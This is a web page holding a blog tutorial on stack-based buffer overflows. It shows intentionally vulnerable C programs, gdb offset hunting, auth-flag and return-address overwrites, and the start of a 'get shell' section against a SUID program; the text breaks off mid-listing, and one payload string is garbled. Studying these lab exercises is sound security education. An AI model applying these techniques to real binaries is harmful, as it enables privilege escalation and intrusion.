<!DOCTYPE html><html lang="en"> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/me.svg"><meta name="generator" content="Astro v4.15.4"><!-- Canonical URL --><link rel="canonical" href="https://danielorihuela.dev/blog/stack-based-buffer-overflows/"><!-- Primary Meta Tags --><title>Stack-based buffer overflows</title><meta name="title" content="Stack-based buffer overflows"><meta name="description" content="Learn how stack-based buffer overflows work and discover preventive measures to safeguard your code against them."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://danielorihuela.dev/blog/stack-based-buffer-overflows/"><meta property="og:title" content="Stack-based buffer overflows"><meta property="og:description" content="Learn how stack-based buffer overflows work and discover preventive measures to safeguard your code against them."><meta property="og:image" content="https://danielorihuela.dev/_astro/stack-overflow.VznqiZXX.png"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://danielorihuela.dev/blog/stack-based-buffer-overflows/"><meta property="twitter:title" content="Stack-based buffer overflows"><meta property="twitter:description" content="Learn how stack-based buffer overflows work and discover preventive measures to safeguard your code against them."><meta property="twitter:image" content="https://danielorihuela.dev/_astro/stack-overflow.VznqiZXX.png"><!-- RSS --><link rel="alternate" type="application/rss+xml" title="Daniel Orihuela" href="https://danielorihuela.dev/feed.xml"><link rel="stylesheet" href="/_astro/about.BdnWl1ph.css">
<link rel="stylesheet" href="/_astro/_slug_.wqGeQQNF.css">
<style>img{margin:0 auto}div+h1{margin-top:0}h1,h2,h3,h4,h5,h6{margin-top:1em}
</style><script type="module" src="/_astro/hoisted.DNq6m-fi.js"></script></head> <body class="bg-black bg-gradient-to-b from-black to-gray-900w-screen bg-black bg-gradient-to-b from-black to-gray-900"> <header class="px-4 py-0"> <nav class="fixed top-0 left-0 right-0 z-50 transition-all duration-500 bg-black/90 backdrop-blur-md border-b border-royalPurple/50"> <div class="max-w-7xl mx-auto px-6 lg:px-8"> <div class="flex items-center justify-between h-20">  <a href="/" class="text-2xl font-bold text-white hover:text-cyan-400 transition-colors duration-300"> <span class="text-royalPurple">&lt;</span>
DO
<span class="text-royalPurple">/&gt;</span> </a>  <div class="hidden md:flex items-center space-x-8"> <a href="/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Home <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/about" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> About <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/blog" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Blog <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/open-source" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Open Source <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a> </div>  <button id="mobile-menu-button" class="md:hidden text-white hover:text-cyan-400 transition-colors duration-300"> <svg id="menu-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" class="w-6 h-6"> <path id="menu-path" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"></path> </svg> </button> </div>  <div id="mobile-menu" class="md:hidden transition-all duration-300 overflow-hidden max-h-0 opacity-0"> <div class="py-4 space-y-2 bg-black/95 backdrop-blur-md rounded-lg mt-2 border border-purple-900/30"> <a href="/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Home </a><a href="/about" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> About </a><a href="/blog" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Blog </a><a href="/open-source" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Open Source </a> </div> </div> </div> </nav>  </header> <article class="my-32"> <div class="w-[80ch] max-w-full m-auto text-[#d3d3d3] bg-[#222222] rounded-2xl p-8 lg:p-12 border border-gray-600/30 shadow-2xl prose prose-xl prose-invert max-w-none"> <div class="w-96 max-w-full m-auto"> <img src="/_astro/stack-overflow.VznqiZXX_ZDz1Ma.webp" class="rounded-xl shadow-ba" alt="" width="1024" height="1024" loading="lazy" decoding="async"> </div> <div class="py-4 text-center leading-none"> <div class="mb-2 text-[#ffffff]"> <time datetime="2023-10-20T00:00:00.000Z"> Oct 20, 2023 </time> </div> <h1 class="font-[Iceland]"> Stack-based buffer overflows </h1> <hr> </div>  <ul>
<li><a href="#whats-a-buffer-overflow">What’s a buffer overflow?</a></li>
<li><a href="#whats-the-stack">What’s the stack?</a></li>
<li><a href="#how-to-exploit-stack-based-buffer-overflows">How to exploit stack based buffer
overflows</a>
<ul>
<li><a href="#overwrite-local-variable-in-stack-frame">Overwrite local variable in stack
frame</a></li>
<li><a href="#overwrite-return-address">Overwrite return address</a></li>
<li><a href="#get-shell">Get shell</a></li>
</ul>
</li>
<li><a href="#how-can-we-prevent-buffer-overflows">How can we prevent buffer
overflows?</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ul>
<h1 id="whats-a-buffer-overflow">What’s a buffer overflow?</h1>
<p>Buffer overflows are a type of vulnerability where the attacker gives
more data to a buffer than it can handle. As a result, the program
overwrites adjacent memory locations with the exceeding data. Usually,
the program will crash. However, a skilled hacker can take control of
the program as it crashes and achieve incredible things, like access to
a shell. Nowadays, there are some countermeasures in place. They make it
much harder but not impossible. Especially if using languages like C or
C++, that lets developers manage the memory.</p>
<p>There are two types of buffer overflows: stack-based and heap-based. In
this post, we will talk about the first type.</p>
<h1 id="whats-the-stack">What’s the stack?</h1>
<p>Before jumping right into stack-based buffer overflows, we need to
understand what a “stack” is in this context and how it works.</p>
<p>The stack is a region of memory reserved for each thread to store data.
Each time you call a function, a stack frame is created where the
arguments, the local variables and the return address are stored in a
Last Input First Output (LIFO) manner. Once it finishes, the program
“removes” the stack frame from the stack and resumes the execution of
the caller thanks to the return address. Now, on the top of the stack,
we have the stack frame from the resumed function. The program is ready
to go.</p>
<p>Stack example:</p>
<p><img  src="/_astro/stack-frame-graph.CG16iFSp_v9cnP.webp" alt="" width="359" height="216" loading="lazy" decoding="async"></p>
<p>Great! We understand the basis of how the stack works at a high level.
However, we still need to know the low-level details of that process if
we want to exploit it. So, what’s actually happening? How does the
computer know which instruction to execute? How does the computer know
how to resume the execution of the caller function? How does it create
and remove the stack frame? That’s all due to registers. The CPU of a
computer use different registers to store data, transfer data, store
instructions, … We are interested in the Extended Instruction Pointer
(EIP), which stores the memory address of the next instruction to
execute; the Extended Stack Pointer (ESP), which points to the top of
the stack frame; and the Extended Base Pointer (EBP), which points to
the bottom of the stack frame. Whenever we call a function, the EBP will
store the actual ESP. The end of the caller function stack frame is the
beginning of the called function stack frame. Pushing data to the stack
will increase the ESP. The EIP will point to the next instruction to
execute. Once we reach the return statement, the ESP will be equal to
EBP (removing the stack frame) and the EIP will be equal to the return
address. The process is much more complex than that. For instance, I’m
not explaining how the EBP is restored. I encourage you to do some
further research about the topic. I don’t think we need more for that
post.</p>
<p>We should have a clear idea of how stack frames work and some lower
details. We are ready to exploit some programs.</p>
<h1 id="how-to-exploit-stack-based-buffer-overflows">How to exploit stack based buffer overflows</h1>
<p>Relevant system information:</p>
<ul>
<li>Linux 5.15.0-86-generic x86_64</li>
<li>Intel(R) Core(TM) i7-10510U CPU</li>
<li>Little Endian</li>
<li>48 bits address size</li>
</ul>
<p>All the vulnerable programs are from <strong>Hacking: The Art of Exploitation,
2nd Edition</strong>. They may contain modification to use in modern machines.
You can get the original source code
<a href="https://github.com/intere/hacking/blob/master/booksrc">https://github.com/intere/hacking/blob/master/booksrc</a>.</p>
<h2 id="overwrite-local-variable-in-stack-frame">Overwrite local variable in stack frame</h2>
<p>Let’s start with the <code>auth_overflow.c</code>.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &#x3C;</span><span style="color:#F1FA8C">stdio.h</span><span style="color:#E9F284">></span></span>
<span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &#x3C;</span><span style="color:#F1FA8C">stdlib.h</span><span style="color:#E9F284">></span></span>
<span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &#x3C;</span><span style="color:#F1FA8C">string.h</span><span style="color:#E9F284">></span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">int</span><span style="color:#50FA7B"> check_authentication</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">char</span><span style="color:#FF79C6"> *</span><span style="color:#FFB86C;font-style:italic">password</span><span style="color:#F8F8F2">) {</span></span>
<span class="line"><span style="color:#FF79C6">  int</span><span style="color:#F8F8F2"> auth_flag </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">;</span></span>
<span class="line"><span style="color:#FF79C6">  char</span><span style="color:#F8F8F2"> password_buffer[</span><span style="color:#BD93F9">16</span><span style="color:#F8F8F2">];</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">  strcpy</span><span style="color:#F8F8F2">(password_buffer, password);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">  if</span><span style="color:#F8F8F2">(</span><span style="color:#50FA7B">strcmp</span><span style="color:#F8F8F2">(password_buffer, </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">brillig</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">) </span><span style="color:#FF79C6">==</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#F8F8F2">    auth_flag </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> 1</span><span style="color:#F8F8F2">;</span></span>
<span class="line"><span style="color:#FF79C6">  if</span><span style="color:#F8F8F2">(</span><span style="color:#50FA7B">strcmp</span><span style="color:#F8F8F2">(password_buffer, </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">outgrabe</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">) </span><span style="color:#FF79C6">==</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#F8F8F2">    auth_flag </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> 1</span><span style="color:#F8F8F2">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">  return</span><span style="color:#F8F8F2"> auth_flag;</span></span>
<span class="line"><span style="color:#F8F8F2">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">int</span><span style="color:#50FA7B"> main</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">int</span><span style="color:#FFB86C;font-style:italic"> argc</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">char</span><span style="color:#FF79C6"> *</span><span style="color:#FFB86C;font-style:italic">argv</span><span style="color:#FF79C6">[]</span><span style="color:#F8F8F2">) {</span></span>
<span class="line"><span style="color:#FF79C6">  if</span><span style="color:#F8F8F2">(argc </span><span style="color:#FF79C6">&#x3C;</span><span style="color:#BD93F9"> 2</span><span style="color:#F8F8F2">) {</span></span>
<span class="line"><span style="color:#50FA7B">    printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">Usage: </span><span style="color:#BD93F9">%s</span><span style="color:#F1FA8C"> &#x3C;password></span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, argv[</span><span style="color:#BD93F9">0</span><span style="color:#F8F8F2">]);</span></span>
<span class="line"><span style="color:#50FA7B">    exit</span><span style="color:#F8F8F2">(</span><span style="color:#BD93F9">0</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#F8F8F2">  }</span></span>
<span class="line"><span style="color:#FF79C6">  if</span><span style="color:#F8F8F2">(</span><span style="color:#50FA7B">check_authentication</span><span style="color:#F8F8F2">(argv[</span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">])) {</span></span>
<span class="line"><span style="color:#50FA7B">    printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#FF79C6">\n</span><span style="color:#F1FA8C">-=-=-=-=-=-=-=-=-=-=-=-=-=-</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#50FA7B">    printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">      Access Granted.</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#50FA7B">    printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">-=-=-=-=-=-=-=-=-=-=-=-=-=-</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#F8F8F2">  } </span><span style="color:#FF79C6">else</span><span style="color:#F8F8F2"> {</span></span>
<span class="line"><span style="color:#50FA7B">    printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#FF79C6">\n</span><span style="color:#F1FA8C">Access Denied.</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#F8F8F2">  }</span></span>
<span class="line"><span style="color:#F8F8F2">}</span></span>
<span class="line"></span></code></pre>
<p>The program is simple. It receives a password. If it’s equal to
“brillig” or “outgrabe” we will see the message “Access Granted”,
otherwise, we will see “Access Denied”. With a buffer overflow, we can
get the “Access Granted” message even when the password is invalid.</p>
<p>The error is inside the <code>check_authentication</code> function, which copies
the <code>password</code> data to the <code>password_buffer</code> without checking the
length. Notice that the <code>password_buffer</code> can hold a maximum of 16
bytes. In other words, the program will reserve 16 bytes in the stack
for that variable. Nevertheless, the data behind the <code>password</code> pointer
can hold a larger array of characters. The idea here is to give the
program a password longer than 16 bytes so that when the data is copied
into the <code>password_buffer</code>, the extra bytes overwrite the <code>auth_flag</code>.
That’s the boolean that decides the message to be shown. If we can
control it, we can control the printed message. Remember that the stack
frame is a LIFO. Hence, the <code>password_buffer</code> will be on top of the
<code>auth_flag</code>.</p>
<p>Let’s compile the program and execute it with a bigger password than
expected.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gcc</span><span style="color:#F1FA8C"> auth_overflow.c</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> auth_overflow</span></span>
<span class="line"><span style="color:#50FA7B">./auth_overflow</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">password</span><span style="color:#E9F284">"</span></span>
<span class="line"></span></code></pre>
<p>I’ve tried with several lengths. With 25 characters, the program fails.</p>
<p><img  src="/_astro/auth-overflow-stack-smashing.BS7gZKkC_Z13DjUp.webp" alt="" width="1182" height="244" loading="lazy" decoding="async"></p>
<p>There’s something curious, though. The function variables only take 20
bytes, 16 for the <code>password_buffer</code> and 4 for the <code>auth_flag</code>, but we
need 25 bytes to make it fail. I did some research, and it seems like it
could be related to some padding that the compiler or the system is
adding between variables. In any case, the program is failing with
“stack smashing”. That tells us that the compiler detected the buffer
overflow attack and stoped the execution. Current versions of GCC use
“canaries” to detect buffer overflows. It adds some data in the stack
frame at the beginning of the function and expects that it remains
unchanged when exiting it. Let’s disable that for our learning.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gcc</span><span style="color:#F1FA8C"> auth_overflow.c</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> auth_overflow</span><span style="color:#BD93F9"> -fno-stack-protector</span></span>
<span class="line"></span></code></pre>
<p><img  src="/_astro/auth-overflow-no-stack-protector.intDcIbx_ms7T0.webp" alt="" width="687" height="117" loading="lazy" decoding="async"></p>
<p>With canaries disabled, let’s see how many bytes are between the
<code>password_buffer</code> and the <code>auth_flag</code>. That will tell us the password
length needed to overwrite the <code>auth_flag</code>. For that, we can use gdb.
It’s only a matter of placing a breakpoint inside the vulnerable
function and checking the memory addresses.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gcc</span><span style="color:#F1FA8C"> auth_overflow.c</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> auth_overflow</span><span style="color:#BD93F9"> -fno-stack-protector</span><span style="color:#BD93F9"> -g</span><span style="color:#6272A4"> # -g option adds debug symbols</span></span>
<span class="line"><span style="color:#50FA7B">gdb</span><span style="color:#F1FA8C"> ./auth_overflow</span></span>
<span class="line"></span></code></pre>
<p><img  src="/_astro/auth-overflow-gdb-variables-distance.FmqLgIFi_cdWI7.webp" alt="" width="1311" height="754" loading="lazy" decoding="async"></p>
<p>There are 28 bytes between the two variables. That means that we need a
password with 29 characters. The first 28 to fill the space between the
variables, and the last one to overwrite the <code>auth_flag</code>. We need it to
be different to 0. For example, “a” should overwrite the <code>auth_flag</code>
value with its ASCII decimal value (97). We can see that in action by
placing a couple of breakpoints. One before the <code>strcpy</code> and one after.</p>
<p><img  src="/_astro/auth-overflow-auth-flag-new-value.DpYRttl__Z1toXRs.webp" alt="" width="1726" height="378" loading="lazy" decoding="async"></p>
<p>That’s it! We got the “Access Granted” message.</p>
<p><img  src="/_astro/auth-overflow-access-granted.COtVhOm0_ZXItMB.webp" alt="" width="677" height="285" loading="lazy" decoding="async"></p>
<h2 id="overwrite-return-address">Overwrite return address</h2>
<p>The first example is limited, right? We can do something interesting
only if the variable we want to overwrite is stored in the stack before
the one we are using to exploit it. What could we do if the variable is
not there or appears after? The idea in that situation is to overwrite
the return address.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &#x3C;</span><span style="color:#F1FA8C">stdio.h</span><span style="color:#E9F284">></span></span>
<span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &#x3C;</span><span style="color:#F1FA8C">stdlib.h</span><span style="color:#E9F284">></span></span>
<span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &#x3C;</span><span style="color:#F1FA8C">string.h</span><span style="color:#E9F284">></span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">int</span><span style="color:#50FA7B"> check_authentication</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">char</span><span style="color:#FF79C6"> *</span><span style="color:#FFB86C;font-style:italic">password</span><span style="color:#F8F8F2">) {</span></span>
<span class="line"><span style="color:#FF79C6">  char</span><span style="color:#F8F8F2"> password_buffer[</span><span style="color:#BD93F9">16</span><span style="color:#F8F8F2">];</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">  strcpy</span><span style="color:#F8F8F2">(password_buffer, password);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">  int</span><span style="color:#F8F8F2"> auth_flag </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">;</span></span>
<span class="line"><span style="color:#FF79C6">  if</span><span style="color:#F8F8F2">(</span><span style="color:#50FA7B">strcmp</span><span style="color:#F8F8F2">(password_buffer, </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">brillig</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">) </span><span style="color:#FF79C6">==</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#F8F8F2">    auth_flag </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> 1</span><span style="color:#F8F8F2">;</span></span>
<span class="line"><span style="color:#FF79C6">  if</span><span style="color:#F8F8F2">(</span><span style="color:#50FA7B">strcmp</span><span style="color:#F8F8F2">(password_buffer, </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">outgrabe</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">) </span><span style="color:#FF79C6">==</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#F8F8F2">    auth_flag </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> 1</span><span style="color:#F8F8F2">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">  return</span><span style="color:#F8F8F2"> auth_flag;</span></span>
<span class="line"><span style="color:#F8F8F2">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">int</span><span style="color:#50FA7B"> main</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">int</span><span style="color:#FFB86C;font-style:italic"> argc</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">char</span><span style="color:#FF79C6"> *</span><span style="color:#FFB86C;font-style:italic">argv</span><span style="color:#FF79C6">[]</span><span style="color:#F8F8F2">) {</span></span>
<span class="line"><span style="color:#FF79C6">  if</span><span style="color:#F8F8F2">(argc </span><span style="color:#FF79C6">&#x3C;</span><span style="color:#BD93F9"> 2</span><span style="color:#F8F8F2">) {</span></span>
<span class="line"><span style="color:#50FA7B">    printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">Usage: </span><span style="color:#BD93F9">%s</span><span style="color:#F1FA8C"> &#x3C;password></span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, argv[</span><span style="color:#BD93F9">0</span><span style="color:#F8F8F2">]);</span></span>
<span class="line"><span style="color:#50FA7B">    exit</span><span style="color:#F8F8F2">(</span><span style="color:#BD93F9">0</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#F8F8F2">  }</span></span>
<span class="line"><span style="color:#FF79C6">  if</span><span style="color:#F8F8F2">(</span><span style="color:#50FA7B">check_authentication</span><span style="color:#F8F8F2">(argv[</span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">])) {</span></span>
<span class="line"><span style="color:#50FA7B">    printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#FF79C6">\n</span><span style="color:#F1FA8C">-=-=-=-=-=-=-=-=-=-=-=-=-=-</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#50FA7B">    printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">      Access Granted.</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#50FA7B">    printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">-=-=-=-=-=-=-=-=-=-=-=-=-=-</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#F8F8F2">  } </span><span style="color:#FF79C6">else</span><span style="color:#F8F8F2"> {</span></span>
<span class="line"><span style="color:#50FA7B">    printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#FF79C6">\n</span><span style="color:#F1FA8C">Access Denied.</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#F8F8F2">  }</span></span>
<span class="line"><span style="color:#F8F8F2">}</span></span>
<span class="line"></span></code></pre>
<p>First, compile it without security protections and debug symbols. Here
we added the <code>no-pie</code> option. PIE stands for Position Independent
Executable. If enabled, the executable will be loaded in a different
memory address every time.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gcc</span><span style="color:#F1FA8C"> auth_overflow2.c</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> auth_overflow2</span><span style="color:#BD93F9"> -fno-stack-protector</span><span style="color:#BD93F9"> -no-pie</span><span style="color:#BD93F9"> -g</span></span>
<span class="line"></span></code></pre>
<p>Now, where is the return address? How can we overwrite it? As in the
first example, gdb is our friend. We can put a breakpoint inside
<code>check_authentication</code>, run and execute <code>info frame</code>. The <code>rip</code> register
contains the return address.</p>
<p><img  src="/_astro/auth-overflow2-info-frame.Bqdxd_ts_2qKL6D.webp" alt="" width="1309" height="323" loading="lazy" decoding="async"></p>
<p>At this point, it’s a matter of trying several passwords until we find
the number of bytes till the <code>rip</code> register. Same procedure as in the
first example. Writing a password with 40 “a” and 3 “b” will overwrite
the <code>rip</code> with the ASCII value of “bbb” (0x626262).</p>
<p><img  src="/_astro/auth-overflow2-overwrite-rip.BbU-un7Z_eL0Kq.webp" alt="" width="1300" height="525" loading="lazy" decoding="async"></p>
<p>That’s cool, but we want to overwrite the <code>rip</code> to change the code flow
and show us the “Access Granted” message. We can disassemble the main
function to see where the <code>print</code> functions are and get the memory
address for the first <code>print</code>. The +86 memory address points to the
conditional before the prints. We can take the next address. If PIE was
enabled, this wouldn’t be that easy. The address would change every time
we run it.</p>
<p><img  src="/_astro/auth-overflow2-access-granted-address.CkDqvnED_lYhyL.webp" alt="" width="1103" height="962" loading="lazy" decoding="async"></p>
<p>Replacing “bbb” with “<code>\x</code>{=latex}7f<code>\x12</code>{=latex}<code>\x40</code>{=latex}” gives
us the “Access Granted” message. We add the memory address in reverse
because my machine uses Little Endian.</p>
<p><img  src="/_astro/auth-overflow2-access-granted.ByReQBgo_28Ev2X.webp" alt="" width="1348" height="205" loading="lazy" decoding="async"></p>
<h2 id="get-shell">Get shell</h2>
<p>The second example was a bit more interesting, but still limited. In
this final example, we are going to see how to get access to a shell.</p>
<p>We have two small programs. The first program creates notes in
“/var/notes”. root must own the executable and have the SUID activated.
That way, we can execute it with normal users as if it was root.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &#x3C;</span><span style="color:#F1FA8C">stdio.h</span><span style="color:#E9F284">></span></span>
<span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &#x3C;</span><span style="color:#F1FA8C">stdlib.h</span><span style="color:#E9F284">></span></span>
<span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &#x3C;</span><span style="color:#F1FA8C">string.h</span><span style="color:#E9F284">></span></span>
<span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &#x3C;</span><span style="color:#F1FA8C">fcntl.h</span><span style="color:#E9F284">></span></span>
<span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &#x3C;</span><span style="color:#F1FA8C">sys/stat.h</span><span style="color:#E9F284">></span></span>
<span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">hacking.h</span><span style="color:#E9F284">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">void</span><span style="color:#50FA7B"> usage</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">char</span><span style="color:#FF79C6"> *</span><span style="color:#FFB86C;font-style:italic">prog_name</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">char</span><span style="color:#FF79C6"> *</span><span style="color:#FFB86C;font-style:italic">filename</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#F8F8F2">{</span></span>
<span class="line"><span style="color:#50FA7B">  printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">Usage: </span><span style="color:#BD93F9">%s</span><span style="color:#F1FA8C"> &#x3C;data to add to </span><span style="color:#BD93F9">%s</span><span style="color:#F1FA8C">></span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, prog_name, filename);</span></span>
<span class="line"><span style="color:#50FA7B">  exit</span><span style="color:#F8F8F2">(</span><span style="color:#BD93F9">0</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#F8F8F2">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">void</span><span style="color:#50FA7B"> fatal</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">char</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2">);</span><span style="color:#6272A4">            // A function for fatal errors</span></span>
<span class="line"><span style="color:#FF79C6">void</span><span style="color:#FF79C6"> *</span><span style="color:#50FA7B">ec_malloc</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">unsigned</span><span style="color:#FFB86C;font-style:italic"> int</span><span style="color:#F8F8F2">);</span><span style="color:#6272A4"> // An error-checked malloc() wrapper</span></span>
<span class="line"></span>
